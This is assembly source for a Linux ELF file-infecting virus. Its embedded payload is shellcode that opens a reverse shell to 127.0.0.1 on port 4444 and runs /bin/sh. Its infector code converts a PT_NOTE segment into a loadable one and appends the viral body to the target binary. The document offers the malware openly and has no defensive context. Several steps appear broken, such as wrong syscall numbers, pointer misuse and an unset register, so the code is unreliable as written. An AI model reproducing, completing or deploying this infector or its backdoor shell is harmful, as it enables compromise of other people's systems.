section .data
	SEEK_END equ 2
	SYS_PWRITE64  equ 18

section .text
global _start

virus_start:
    push 41
    pop rax             
    push 2
    pop rdi              
    push 1
    pop rsi              
    cdq          
    syscall

    xchg edi, eax       
    mov al, 42          
    push rdx            
    push dword 0x0100007f    
    push word 0x5c11        
    push word 2               
    mov rsi, rsp               
    mov dl, 16                 
    syscall

    push 2
    pop rsi                   

dup2Loop:
    mov al, 33              
    syscall                
    dec sil             
    jns dup2Loop               

    push rax                
    mov rdi,  0x68732f6e69622f2f    
    push rdi              
    mov rdi, rsp         
    push rax                   
    mov rsi, rsp              
    xor dl, dl                  
    mov al, 59            
    syscall

virus_end:

_start:

    mov rdi, [rsp+0x18]    

    mov rax, 2     
    mov rsi, 2         
    xor rdx, rdx        
    syscall
    
    test rax, rax
    js file_open_error   

    mov r14, qword [rsp + 168] 

    xor rcx, rcx             
    xor rdx, rdx                
    mov cx, word [rax+0x36]    
    mov rbx, qword [rax+0x20]  
    mov dx, word [rax+0x2a]     

parse_phdr_loop:
    add rbx, rdx               
    dec rcx                     
    cmp dword [rax+rbx], 0x4      
    jne not_pt_note_segment       

    mov dword [rax+rbx], 1                    
    mov dword [rax+rbx+4], 5             
    mov r13, qword [rsp+48]                 
    add r13, 0xc000000                      
    mov qword [rax+rbx+16], r13            
    mov qword [rax+rbx+32], 0x200000      
    add qword [rax+rbx+24], virus_end - virus_start + 5
    add qword [rax+rbx+32], virus_end - virus_start + 5  

    mov dword [rax+rbx+4], 5             

    mov rax, 0         
    mov rdi, rax       
    mov rsi, 0          
    mov rdx, 2       
    syscall            
    mov rdi, rax    

    mov rax, 1      
    mov rsi, rdi       
    mov rdx, 0           
    mov rdi, 0          
    syscall          

    mov [rax+rbx+24], rdi 

not_pt_note_segment:
    cmp rcx, 0                     
    jg parse_phdr_loop         

    mov rdx, virus_start
    add rdx, 5              
    sub r14, rdx               
    sub r14, virus_end - virus_start  
    mov byte [rax+rbx+88], 0xe9  
    mov dword [rax+rbx+89], r14d  

file_open_error:

.append_virus:
    mov rax, 0           
    mov rdi, r9              
    mov rsi, 0             
    mov rdx, SEEK_END      
    syscall                
    push rax          

    call .delta              
.delta:
    pop rbp                 
    sub rbp, .delta            

    mov rdi, r9             
    lea rsi, [rbp + virus_start] 
    mov rdx, virus_end - virus_start  
    mov r10, rax              
    mov rax, SYS_PWRITE64    
    syscall                  

.exit:
    mov rax, 60           
    xor rdi, rdi            
    syscall                  
